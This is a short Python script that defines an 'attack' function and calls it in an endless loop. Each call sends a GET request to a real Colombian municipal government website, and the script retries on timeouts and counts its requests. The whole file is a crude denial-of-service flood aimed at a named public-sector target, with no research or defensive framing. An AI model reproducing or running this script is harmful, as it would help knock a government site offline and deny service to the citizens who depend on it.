import requests as rq
i = 0
def attack():
    r = rq.get("http://www.ortega-tolima.gov.co/index.shtml", timeout=None)
    print "HTTP// ortega-tolima.gov.co"
    
   
    
while True:
    
    
        
    try:
        print "HTTP// ortega-tolima.gov.co " + str(i)
        attack()
    except rq.exceptions.ConnectTimeout:
        attack()
    
    i = i + 1
        

print "Termine"